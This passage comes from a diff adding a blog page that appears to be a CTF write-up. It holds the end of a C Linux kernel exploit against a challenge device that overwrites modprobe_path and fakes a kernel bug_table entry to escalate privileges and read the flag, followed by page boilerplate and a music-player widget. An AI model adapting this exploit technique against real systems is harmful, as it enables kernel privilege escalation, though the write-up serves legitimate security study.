+<span id="cb12-106"><a href="#cb12-106" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>alg_fd <span class="op">&lt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-107"><a href="#cb12-107" aria-hidden="true" tabindex="-1"></a>                perror<span class="op">(</span><span class="st">&quot;socket(AF_ALG) failed&quot;</span><span class="op">);</span></span>
+<span id="cb12-108"><a href="#cb12-108" aria-hidden="true" tabindex="-1"></a>                <span class="cf">return</span> <span class="dv">1</span><span class="op">;</span></span>
+<span id="cb12-109"><a href="#cb12-109" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb12-110"><a href="#cb12-110" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-111"><a href="#cb12-111" aria-hidden="true" tabindex="-1"></a>        memset<span class="op">(&amp;</span>sa<span class="op">,</span> <span class="dv">0</span><span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>sa<span class="op">));</span></span>
+<span id="cb12-112"><a href="#cb12-112" aria-hidden="true" tabindex="-1"></a>        sa<span class="op">.</span>salg_family <span class="op">=</span> AF_ALG<span class="op">;</span></span>
+<span id="cb12-113"><a href="#cb12-113" aria-hidden="true" tabindex="-1"></a>        strcpy<span class="op">((</span><span class="dt">char</span> <span class="op">*)</span>sa<span class="op">.</span>salg_type<span class="op">,</span> <span class="st">&quot;peroperopero&quot;</span><span class="op">);</span></span>
+<span id="cb12-114"><a href="#cb12-114" aria-hidden="true" tabindex="-1"></a>        bind<span class="op">(</span>alg_fd<span class="op">,</span> <span class="op">(</span><span class="kw">struct</span> sockaddr <span class="op">*)&amp;</span>sa<span class="op">,</span> <span class="kw">sizeof</span><span class="op">(</span>sa<span class="op">));</span></span>
+<span id="cb12-115"><a href="#cb12-115" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb12-116"><a href="#cb12-116" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-117"><a href="#cb12-117" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-118"><a href="#cb12-118" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> child_stage<span class="op">(){</span></span>
+<span id="cb12-119"><a href="#cb12-119" aria-hidden="true" tabindex="-1"></a>    small_delay<span class="op">(</span><span class="dv">2000000</span><span class="op">);</span></span>
+<span id="cb12-120"><a href="#cb12-120" aria-hidden="true" tabindex="-1"></a>    puts<span class="op">(</span><span class="st">&quot;child is running</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb12-121"><a href="#cb12-121" aria-hidden="true" tabindex="-1"></a>    pid_t pid3 <span class="op">=</span> fork<span class="op">();</span></span>
+<span id="cb12-122"><a href="#cb12-122" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>pid3 <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-123"><a href="#cb12-123" aria-hidden="true" tabindex="-1"></a>        small_delay<span class="op">(</span><span class="dv">10000</span><span class="op">);</span> <span class="co">// make sure its done overwriting modprobe</span></span>
+<span id="cb12-124"><a href="#cb12-124" aria-hidden="true" tabindex="-1"></a>        trigger<span class="op">();</span></span>
+<span id="cb12-125"><a href="#cb12-125" aria-hidden="true" tabindex="-1"></a>        read_flag<span class="op">();</span></span>
+<span id="cb12-126"><a href="#cb12-126" aria-hidden="true" tabindex="-1"></a>        _exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb12-127"><a href="#cb12-127" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-128"><a href="#cb12-128" aria-hidden="true" tabindex="-1"></a>    child_irq_writer<span class="op">();</span></span>
+<span id="cb12-129"><a href="#cb12-129" aria-hidden="true" tabindex="-1"></a>    _exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb12-130"><a href="#cb12-130" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb12-131"><a href="#cb12-131" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-132"><a href="#cb12-132" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(){</span></span>
+<span id="cb12-133"><a href="#cb12-133" aria-hidden="true" tabindex="-1"></a>    <span class="co">// modprobe set up</span></span>
+<span id="cb12-134"><a href="#cb12-134" aria-hidden="true" tabindex="-1"></a>    make_modprobe_script<span class="op">();</span></span>
+<span id="cb12-135"><a href="#cb12-135" aria-hidden="true" tabindex="-1"></a>    make_binfmt_trigger<span class="op">();</span></span>
+<span id="cb12-136"><a href="#cb12-136" aria-hidden="true" tabindex="-1"></a>    <span class="dt">int</span> fd <span class="op">=</span> open<span class="op">(</span><span class="st">&quot;/dev/jojo&quot;</span><span class="op">,</span> <span class="bn">0644</span><span class="op">,</span> <span class="dv">0</span><span class="op">);</span></span>
+<span id="cb12-137"><a href="#cb12-137" aria-hidden="true" tabindex="-1"></a>    asm_fd <span class="op">=</span> <span class="op">(</span>u64<span class="op">)</span> fd<span class="op">;</span></span>
+<span id="cb12-138"><a href="#cb12-138" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-139"><a href="#cb12-139" aria-hidden="true" tabindex="-1"></a>    <span class="co">// child overwrites modprobe, triggers binfmt and reads the flag to stdout</span></span>
+<span id="cb12-140"><a href="#cb12-140" aria-hidden="true" tabindex="-1"></a>    pid_t pid <span class="op">=</span> fork<span class="op">();</span></span>
+<span id="cb12-141"><a href="#cb12-141" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>pid <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb12-142"><a href="#cb12-142" aria-hidden="true" tabindex="-1"></a>        child_stage<span class="op">();</span></span>
+<span id="cb12-143"><a href="#cb12-143" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb12-144"><a href="#cb12-144" aria-hidden="true" tabindex="-1"></a>    <span class="co">// parent fakes a bug_entry in the bug_table to mark the entry for the irqentry_enter+151 (ud2) as &quot;done&quot;.</span></span>
+<span id="cb12-145"><a href="#cb12-145" aria-hidden="true" tabindex="-1"></a>    <span class="co">// so it returs early without triggering a call to warn().</span></span>
+<span id="cb12-146"><a href="#cb12-146" aria-hidden="true" tabindex="-1"></a>    u64 target <span class="op">=</span> <span class="bn">0xffffffff830ef3c0</span> <span class="op">+</span> <span class="bn">0xa8</span><span class="op">;</span> <span class="co">// ___start____bug_table, 0xa8 is the offset for r15</span></span>
+<span id="cb12-147"><a href="#cb12-147" aria-hidden="true" tabindex="-1"></a>    asm_target <span class="op">=</span> target<span class="op">;</span></span>
+<span id="cb12-148"><a href="#cb12-148" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-149"><a href="#cb12-149" aria-hidden="true" tabindex="-1"></a>    asm <span class="dt">volatile</span><span class="op">(</span></span>
+<span id="cb12-150"><a href="#cb12-150" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r10, </span><span class="sc">%%</span><span class="st">r10</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-151"><a href="#cb12-151" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r11, </span><span class="sc">%%</span><span class="st">r11</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-152"><a href="#cb12-152" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r12, </span><span class="sc">%%</span><span class="st">r12</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-153"><a href="#cb12-153" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;xor </span><span class="sc">%%</span><span class="st">r13, </span><span class="sc">%%</span><span class="st">r13</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-154"><a href="#cb12-154" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movabs $0x0007000044444444, </span><span class="sc">%%</span><span class="st">r14</span><span class="sc">\n</span><span class="st">&quot;</span>   <span class="co">// mark the bug_entry for irqentry_enter+151 as done.</span></span>
+<span id="cb12-155"><a href="#cb12-155" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movabs $0x00000000ff3060b7, </span><span class="sc">%%</span><span class="st">r15</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-156"><a href="#cb12-156" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq asm_fd(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">rdi</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-157"><a href="#cb12-157" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;movq asm_target(</span><span class="sc">%%</span><span class="st">rip), </span><span class="sc">%%</span><span class="st">rdx</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-158"><a href="#cb12-158" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;mov $16, </span><span class="sc">%%</span><span class="st">eax</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-159"><a href="#cb12-159" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;syscall</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-160"><a href="#cb12-160" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;1:</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-161"><a href="#cb12-161" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;pause</span><span class="sc">\n</span><span class="st">&quot;</span></span>
+<span id="cb12-162"><a href="#cb12-162" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;jmp 1b</span><span class="sc">\n</span><span class="st">&quot;</span> <span class="co">// block execution so it does not call do_syscall_64</span></span>
+<span id="cb12-163"><a href="#cb12-163" aria-hidden="true" tabindex="-1"></a>                   <span class="co">// you can also mark the bug_entry for do_syscall_64+0x3f9 as done too</span></span>
+<span id="cb12-164"><a href="#cb12-164" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb12-165"><a href="#cb12-165" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span></span>
+<span id="cb12-166"><a href="#cb12-166" aria-hidden="true" tabindex="-1"></a>        <span class="op">:</span> <span class="st">&quot;rax&quot;</span><span class="op">,</span><span class="st">&quot;rbx&quot;</span><span class="op">,</span><span class="st">&quot;rcx&quot;</span><span class="op">,</span><span class="st">&quot;rdx&quot;</span><span class="op">,</span><span class="st">&quot;rdi&quot;</span><span class="op">,</span><span class="st">&quot;rsi&quot;</span><span class="op">,</span></span>
+<span id="cb12-167"><a href="#cb12-167" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;r8&quot;</span><span class="op">,</span><span class="st">&quot;r9&quot;</span><span class="op">,</span><span class="st">&quot;r10&quot;</span><span class="op">,</span><span class="st">&quot;r11&quot;</span><span class="op">,</span><span class="st">&quot;r12&quot;</span><span class="op">,</span><span class="st">&quot;r13&quot;</span><span class="op">,</span><span class="st">&quot;r14&quot;</span><span class="op">,</span><span class="st">&quot;r15&quot;</span><span class="op">,</span><span class="st">&quot;memory&quot;</span></span>
+<span id="cb12-168"><a href="#cb12-168" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb12-169"><a href="#cb12-169" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb12-170"><a href="#cb12-170" aria-hidden="true" tabindex="-1"></a>    <span class="co">// FLAG: CTFA{w4rn1ngs_4r3_jus7_sugg3st10ns-n3v3r-p4n1c-0n-th3m}</span></span>
+<span id="cb12-171"><a href="#cb12-171" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+
+</main>
+
+<nav class="border">
+    <a href="/blog">blog index</a>
+</nav>
+
+<div id="HCB_comment_box" class="border">
+    <a href="http://www.htmlcommentbox.com">HTML Comment Box</a>
+    is loading comments...
+</div>
+
+<script type="text/javascript">
+if(!window.hcb_user){hcb_user={};}
+(function(){
+    var s=document.createElement("script"),
+        l=hcb_user.PAGE || (""+window.location).replace(/'/g,"%27"),
+        h="https://www.htmlcommentbox.com";
+
+    s.src =
+        h+"/jread?page="+encodeURIComponent(l).replace("+","%2B")
+        +"&mod=%241%24wq1rdBcg%24Nyp.FBMpdPrMCXan9QkAY%2F"
+        +"&opts=16798&num=10&ts=1781804846719";
+
+    document.head.appendChild(s);
+})();
+</script>
+
+<div class="sidebar">
+<div class="border">
+    <div> FAST TRAVEL </div>
+<div>----------------------</div>
+<div> <a href="#x00.-an-unfortune-encounter"> 0x00. An unfortune encounter </a></div>
+<div> <a href="#x01.-reasoning-about-the-panic"> 0x01. Reasoning about the panic </a></div>
+<div> <a href="#x02.-where-does-the-trap-come-from-kono-dio-da">0x02. Where does the Trap come from? (KONO DIO DA!) </a></div>
+<div> <a href="#x03.-activating-our-stands-full-potential">0x03. Activating our stand’s full potential</a></div>
+<div> <a href="#x04.-beating-dio">0x04. Beating Dio</a></div>
+</div>
+</div>
+<div class="profile">
+<div class="border">
+<img src="/img/shark.jpg">
+<center>
+<p> you can also read this on <a href="https://github.com/whitebeltsupremacy/future/blob/main/README.md">github</a></p>
+</center>
+</div>
+</div>
+
+<head>
+<!-----
+
+                                     ,
+              ,-.       _,---._ __  / \
+             /  )    .-'       `./ /   \
+            (  (   ,'            `/    /|
+             \  `-"             \'\   / |
+              `.              ,  \ \ /  |
+               /`.          ,'-`----Y   |
+              (            ;        |   '
+              |  ,-.    ,-'         |  /
+              |  | (   |            | /
+              )  |  \  `.___________|/
+              `--'   `--'
+
+    * windows reskin lovingly created by june @ loveberry.neocities.org / layercake.neocities.org
+    * original multiple song music player by adilene @ adilene.net. [https://pastebin.com/PiDgrv3J]
+    * edited using 98 css [https://jdan.github.io/98.css/]
+ 	* source code: https://github.com/sayantanm19/js-music-player
+									----->
+
+<!-- stuff you can probably edit without breaking the styling lol -->
+<style>
+    .title-bar {
+        background:linear-gradient(90deg, #060b0b, #66a6ff)
+    }
+
+    .player {
+        width:fit-content;
+        border: black solid 1px;
+        border-width: 1px 0px 0px 1px;
+        position: absolute;
+        top: 60%;
+        margin-right:auto;
+    }
+
+    .controlimg:hover {
+        cursor:help;
+    }
+</style>
+
+<!-- below is styling to get windows 98 effect. from 98.css [https://jdan.github.io/98.css/] -->
+<style>
+input[type="range"] {
+  -webkit-appearance: none;
+  appearance: none;
+  width: 100%;
+  background: transparent;
+}
+
+input[type="range"]:focus {
+  outline: none;
+}
+
+input[type="range"]::-webkit-slider-thumb {
+  -webkit-appearance: none;
+  height: 21px;
+  width: 11px;
+  background: svg-load("https://raw.githubusercontent.com/jdan/98.css/main/icon/indicator-horizontal.svg");
+  transform: translateY(-8px);
+  box-shadow: none;
+  border: none;
+}
+
+input[type="range"].has-box-indicator::-webkit-slider-thumb {
+  background: svg-load("https://raw.githubusercontent.com/jdan/98.css/main/icon/indicator-rectangle-horizontal.svg");
+  transform: translateY(-10px);
+}
+
+input[type="range"]::-moz-range-thumb {
+  height: 21px;
+  width: 11px;
+  border: 0;
+  border-radius: 0;
+  background: svg-load("https://raw.githubusercontent.com/jdan/98.css/main/icon/indicator-horizontal.svg");
+  transform: translateY(2px);
+}
+
+input[type="range"]::-moz-range-thumb {
+  background: url("https://raw.githubusercontent.com/jdan/98.css/main/icon/indicator-horizontal.svg");
+  border: 0;
+  border-radius: 0;
+  height: 21px;
+  transform: translateY(2px);
+  width: 11px;
+  }
+
+input[type="range"].has-box-indicator::-moz-range-thumb {
+  background: svg-load("https://raw.githubusercontent.com/jdan/98.css/main/icon/indicator-rectangle-horizontal.svg");
+  transform: translateY(0px);
+}
+
+input[type="range"]::-webkit-slider-runnable-track {
+  width: 100%;
+  height: 2px;
+  box-sizing: border-box;
+  background: black;
+  border-right: 1px solid grey;
+  border-bottom: 1px solid grey;
+  box-shadow: 1px 0 0 white, 1px 1px 0 white, 0 1px 0 white, -1px 0 0 darkgrey,
+    -1px -1px 0 darkgrey, 0 -1px 0 darkgrey, -1px 1px 0 white, 1px -1px darkgrey;
+}
+
+input[type="range"]::-moz-range-track {
+  width: 100%;
+  height: 2px;
+  box-sizing: border-box;
+  background: black;
+  border-right: 1px solid grey;
+  border-bottom: 1px solid grey;
+  box-shadow: 1px 0 0 white, 1px 1px 0 white, 0 1px 0 white, -1px 0 0 darkgrey,
+    -1px -1px 0 darkgrey, 0 -1px 0 darkgrey, -1px 1px 0 white, 1px -1px darkgrey;
+}
+
+button,input,label,option,select,table,textarea,ul.tree-view{-webkit-font-smoothing:none;font-family:"Pixelated MS Sans Serif",Arial;font-size:11px}h1{font-size:5rem}h2{font-size:2.5rem}h3{font-size:2rem}h4{font-size:1.5rem}u{border-bottom:.5px solid #222;text-decoration:none}button,input[type=reset],input[type=submit]{border:none;border-radius:0;box-sizing:border-box;color:transparent;min-height:23px;min-width:75px;padding:0 12px;text-shadow:0 0 #222}.vertical-bar,button,input[type=reset],input[type=submit]{background:silver;box-shadow:inset -1px -1px #0a0a0a,inset 1px 1px #fff,inset -2px -2px grey,inset 2px 2px #dfdfdf}.vertical-bar{height:20px;width:4px}button:not(:disabled):active,input[type=reset]:not(:disabled):active,input[type=submit]:not(:disabled):active{box-shadow:inset -1px -1px #fff,inset 1px 1px #0a0a0a,inset -2px -2px #dfdfdf,inset 2px 2px grey;text-shadow:1px 1px #222}@media (not(hover)){button:not(:disabled):hover,input[type=reset]:not(:disabled):hover,input[type=submit]:not(:disabled):hover{box-shadow:inset -1px -1px #fff,inset 1px 1px #0a0a0a,inset -2px -2px #dfdfdf,inset 2px 2px grey}}button:focus,input[type=reset]:focus,input[type=submit]:focus{outline:1px dotted #000;outline-offset:-4px}button::-moz-focus-inner,input[type=reset]::-moz-focus-inner,input[type=submit]::-moz-focus-inner{border:0}:disabled,:disabled+label,input[readonly],input[readonly]+label{color:grey}:disabled+label,button:disabled,input[type=reset]:disabled,input[type=submit]:disabled{text-shadow:1px 1px 0 #fff}}
+
+.title-bar-controls button {border:none;border-radius:0;box-sizing:border-box;color:transparent;min-height:23px;min-width:75px;padding:0 12px;text-shadow:0 0 #222}
+
+.title-bar-controls button {background:silver;box-shadow:inset -1px -1px #0a0a0a,inset 1px 1px #fff,inset -2px -2px grey,inset 2px 2px #dfdfdf}
+
+.title-bar-controls button:not(:disabled):active {box-shadow:inset -1px -1px #fff,inset 1px 1px #0a0a0a,inset -2px -2px #dfdfdf,inset 2px 2px grey;text-shadow:1px 1px #222}
+
+@media (not(hover)){
+	button:not(:disabled):hover {
+    box-shadow:inset -1px -1px #fff,inset 1px 1px #0a0a0a,inset -2px -2px #dfdfdf,inset 2px 2px grey}
+}
+
+.title-bar-controls button:focus {outline:1px dotted #000; outline-offset:-4px}
+.title-bar-controls button::-moz-focus-inner {border:0}
+
+
+@font-face {
+  font-family: "Pixelated MS Sans Serif";
+  src: url("https://files.catbox.moe/1za99g.woff") format("woff");
+  src: url("https://files.catbox.moe/8fwbkl.woff2") format("woff2");
+  font-weight: normal;
+  font-style: normal;
+}
+
+@font-face {
+  font-family: "Pixelated MS Sans Serif";
+  src: url("https://files.catbox.moe/z7csle.woff") format("woff");
+  src: url("https://files.catbox.moe/moqhx6.woff2") format("woff2");
+  font-weight: bold;
+  font-style: normal;
+}
+
+
+.window, .title-bar {
+  font-family: "Pixelated MS Sans Serif", Arial;
+  -webkit-font-smoothing: none;
+  font-size: 11px;
+}
+
+.window {
+  box-shadow: inset -1px -1px #0a0a0a,
+    inset 1px 1px #dfdfdf, inset -2px -2px #808080,
+    inset 2px 2px #ffffff;
+  background: #c0c0c0;
+  padding: 3px;
+  width:260px;
+}
+
+.title-bar {
+  padding: 3px 2px 3px 3px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.title-bar-text {
+  font-weight: bold;
+  color: white;
+  letter-spacing: 0;
+  margin-right: 24px;
+}
+
+.title-bar-controls {
+  display: flex;
+}
+
+.title-bar-controls button {
+  padding: 0;
+  display: block;
+  min-width: 16px;
+  min-height: 14px;
+}
+
+.title-bar-controls button:active {
+  padding: 0;
+}
+
+.title-bar-controls button:focus {
+  outline: none;
+}
+
+.title-bar-controls button[aria-label=Minimize]{
+background-image:url("https://raw.githubusercontent.com/jdan/98.css/main/icon/minimize.svg");
+background-position:bottom 3px left 4px;
+background-repeat:no-repeat}
+
+.title-bar-controls button[aria-label=Maximize]{
+background-image:url("https://raw.githubusercontent.com/jdan/98.css/4a2282dd9170cabf730fb5803d1153d86b2e94e3/icon/maximize.svg");
+background-position:top 2px left 3px;
+background-repeat:no-repeat}
+
+.title-bar-controls button[aria-label=Close]{
+background-image:url("https://raw.githubusercontent.com/jdan/98.css/main/icon/close.svg");
+background-position:top 3px left 4px;
+background-repeat:no-repeat;
+margin-left:2px}
+
+.window-body { margin:0px; height:98px; }
+
+
+
+input[type=range] {
+        -webkit-appearance: none;
+        appearance:none;
+        width: 100%;
+    }
+
+    input[type=range]:focus {
+        outline: none;
+    }
+
+    /* settings for chrome browsers */
+    input[type=range]::-webkit-slider-runnable-track {
+        width: 100%;
+        height: 2px; /* thickness of seeking track */
+        cursor: help;
+    }
+
+
+    /* settings for firefox browsers */
+    input[type=range]::-moz-range-track {
+        width: 100%;
+        height: 2px; /* thickness of seeking track */
+        cursor: help;
+    }
+
+    .flex {display: flex;}
+
+    .titlebaricon { height:14px; width:14px;}
+
+
+    .songtitlewindow {
+        background-color:#fff;
+        box-shadow:inset -1px -1px #fff,inset 1px 1px grey,inset -2px -2px #dfdfdf,inset 2px 2px #0a0a0a;
+    }
+
+    #musicplayer {
+        border:2px solid silver; /* border around player */
+        border-width: 2px 0px 0px 0px;
+        width:160px; /* width of the player */
+    }
+
+    #imagestyle {
+        background:silver; /* background color of player */
+        border:2px solid silver; /* border around player */
+        width:95px; /* width of the player */
+        height:95px;
+        box-shadow:inset -1px -1px #fff,inset 1px 1px grey,inset -2px -2px #dfdfdf,inset 2px 2px #0a0a0a;
+    }
+
+    .ic {
+    	width:90px;
+        position:relative;
+        bottom:1px;
+        right:1px;
+        overflow:hidden;
+        padding:2px;
+        border:2px solid transparent;
+    }
+
+    .songtitlearrow {
+        background-size:100%;
+        background-repeat:no-repeat;
+        background-image:url(https://files.catbox.moe/f5e8np.png);
+        height:21px;
+        width:21px;
+        position:relative;
+        top:2px;
+        left:-2px;
+        border:0px solid transparent;
+        border-width:0px 0px 0px 0px;
+    }
+
+    .songtitle {
+        padding:5px; /* padding around song title */
+        border-bottom:0px; /* border under song title */
+        display:block;
+        font-family:Pixelated MS Sans Serif;
+        color: black;
+    }
+
+    .controls {
+        font-size:18px !important; /* size of controls */
+        text-align:center;
+        width:100%;
+        position:relative;
+        bottom:30px;
+        border: none;
+    }
+
+    .controls td {
+        padding:8px 5px 0px 5px; /* padding around controls */
+        border: none;
+    }
+
+    button {
+        min-width:40px;
+        border: none;
+    }
+
+    .seeking {
+        background-color:#c0c0c0; /* background color of seeking bar */
+        display:flex;
+        justify-content: space-evenly;
+        padding:14px; /* padding around seeking bar */
+    }
+
+    .current-time {
+        padding-right:5px;
+    }
+
+    .total-duration {
+        padding-left:5px;
+    }
+
+    .controlimg {
+    height:15px;
+    width:15px;
+    }
+</style>
+</head>
+<body>
+<div class="player">
+<div class="window">
+  <div class="title-bar">
+    <div class="title-bar-text"><sub><img class="titlebaricon" src="https://files.catbox.moe/tg55zp.png" alt="cd player icon"></sub> CD player</div>
+    <div class="title-bar-controls">
+      <button aria-label="Minimize"></button>
+      <button aria-label="Maximize"></button>
+      <button aria-label="Close"></button>
+    </div>
+  </div>
+  <div class="window-body">
+    <div class="flex">
+<div id="imagestyle"><img class="ic" src="/img/musicplayer.jpg" alt="icon"></div>
+    <div id="musicplayer">
+        <div class="songtitlewindow">
+            <div class="flex"><marquee scrollamount="4" class="songtitle"></marquee><div class="songtitlearrow"></div></div>
+        </div>
+
+ <div class="seeking">
+            <div class="current-time">00:00</div>
+
+            <input type="range" min="1" max="100" value="0" class="seek_slider" onchange="seekTo()">
+
+            <div class="total-duration">0:00</div>
+        </div>
+
+        <table class="controls">
+            <tr>
+                <td>
+                    <div class="prev-track" onclick="prevTrack()"><button><img src="https://files.catbox.moe/hhoh1h.png" class="controlimg"></button></div>
+                </td>
+                <td>
+                    <div class="playpause-track" onclick="playpauseTrack()" ><button><img src="https://files.catbox.moe/w93riq.png" class="controlimg"></button></div>
+                </td>
+                <td>
+                    <div class="next-track" onclick="nextTrack()"><button><img src="https://files.catbox.moe/p4q9gf.png" class="controlimg"></button></div>
+                </td>
+            </tr>
+        </table>
+
+        <audio id="music" src=""></audio>
+    </div>
+    </div>
+  </div>
+</div>
+    </div>
+</body>
+
+<script>
+        // initiate variables
+        let track_name = document.querySelector(".songtitle");
+
+        let playpause_btn = document.querySelector(".playpause-track");
+        let next_btn = document.querySelector(".next-track");
+        let prev_btn = document.querySelector(".prev-track");
+
+        let seek_slider = document.querySelector(".seek_slider");
+        let curr_time = document.querySelector(".current-time");
+        let total_duration = document.querySelector(".total-duration");
+
+        let track_index = 0;
+        let isPlaying = false;
+        let updateTimer;
+
+        // create new audio element
+        let curr_track = document.getElementById("music");
+
+        //
+        // DEFINE YOUR SONGS HERE!!!!!
+        // MORE THAN FOUR SONGS CAN BE ADDED!!
+        // JUST ADD ANOTHER BRACKET WITH NAME AND PATH
+        // CATBOX.MOE IS RECOMMENDED FOR UPLOADING MP3 FILES
+        let track_list = [
+            {
+                name:"Aphex Twin - Rhubarb",
+                path:"https://files.catbox.moe/54xniv.mp3"
+            },
+        ];
+        //
+        //
+        //
+        //
+        //
+
+        function loadTrack(track_index) {
+            clearInterval(updateTimer);
+            resetValues();
+
+            // load a new track
+            curr_track.src = track_list[track_index].path;
+            curr_track.load();
+
+            // update details of the track
+            track_name.textContent = "playing " + (track_index + 1) + " of " + track_list.length + ": " + track_list[track_index].name;
+
+            // set an interval of 1000 milliseconds for updating the seek slider
+            updateTimer = setInterval(seekUpdate, 1000);
+
+            // move to the next track if the current one finishes playing
+            curr_track.addEventListener("ended", nextTrack);
+        }
+
+        // reset values
+        function resetValues() {
+            curr_time.textContent = "0:00";
+            total_duration.textContent = "0:00";
+            seek_slider.value = 0;
+        }
+
+        // checks if song is playing
+        function playpauseTrack() {
+            if (!isPlaying) playTrack();
+            else pauseTrack();
+        }
+
+        // plays track when play button is pressed
+        function playTrack() {
+            curr_track.play();
+            isPlaying = true;
+
+            // replace icon with the pause icon
+            playpause_btn.innerHTML = '<button><img src="https://files.catbox.moe/njer0s.png" class="controlimg"></i></button>';
+        }
+
+        // pauses track when pause button is pressed
+        function pauseTrack() {
+            curr_track.pause();
+            isPlaying = false;
+
+            // replace icon with the play icon
+            playpause_btn.innerHTML = '<button><img src="https://files.catbox.moe/w93riq.png" class="controlimg"></button>';
+        }
+
+        // moves to the next track
+        function nextTrack() {
+            if (track_index < track_list.length - 1)
+                track_index += 1;
+            else track_index = 0;
+            loadTrack(track_index);
+            playTrack();
+        }
+
+        // moves to the previous track
+        function prevTrack() {
+            if (track_index > 0)
+                track_index -= 1;
+            else track_index = track_list.length;
+            loadTrack(track_index);
+            playTrack();
+        }
+
+        // seeker slider
+        function seekTo() {
+            seekto = curr_track.duration * (seek_slider.value / 100);
+            curr_track.currentTime = seekto;
+        }
+
+        function seekUpdate() {
+            let seekPosition = 0;
+
+            // check if the current track duration is a legible number
+            if (!isNaN(curr_track.duration)) {
+                seekPosition = curr_track.currentTime * (100 / curr_track.duration);
+                seek_slider.value = seekPosition;
+
+            // calculate the time left and the total duration
+            let currentMinutes = Math.floor(curr_track.currentTime / 60);
+            let currentSeconds = Math.floor(curr_track.currentTime - currentMinutes * 60);
+            let durationMinutes = Math.floor(curr_track.duration / 60);
+            let durationSeconds = Math.floor(curr_track.duration - durationMinutes * 60);
+
+            // adding a zero to the single digit time values
+            if (currentSeconds < 10) { currentSeconds = "0" + currentSeconds; }
+            if (durationSeconds < 10) { durationSeconds = "0" + durationSeconds; }
+            if (currentMinutes < 10) { currentMinutes = currentMinutes; }
+            if (durationMinutes < 10) { durationMinutes = durationMinutes; }
+
+            curr_time.textContent = currentMinutes + ":" + currentSeconds;
+            total_duration.textContent = durationMinutes + ":" + durationSeconds;
+          }
+        }
+
+        // load the first track in the tracklist
+        loadTrack(track_index);
+    </script>
+
+
+</body>
+
+  </head>
+  <body>
+      <div style="left:1500px; bottom: -12063px; position:absolute;" class="container">
+        <div style="position:absolute;" class="cube cube_theme">
+    <div style="color:white;font-size: 180%;" class="face top cube_theme"><a href="/main">home</a></div>
+    <div style="color:white;font-size: 180%;" class="face2 bottom cube_theme"><a href="/about">about</a></div>
+    <div style="color:white;font-size: 180%;" class="face3 left cube_theme"><a href="/blog">blog</a></div>
+    <div style="color:white;font-size: 180%;" class="face4 right cube_theme"><a href="/404">???</a></div>
+    <div style="color:white;font-size: 180%;" class="face5 front cube_theme"><a href="/credits">credits</a></div>
+    <div style="color:white;font-size: 160%;" class="face6 back cube_theme"><a href="/wired">wired</a></div>
+      </div>
+    </div>
+  </body>
+
+
+</html>
+
+</script>
+
+
+
+
+
+
+
+
+
+</body>
+</html>
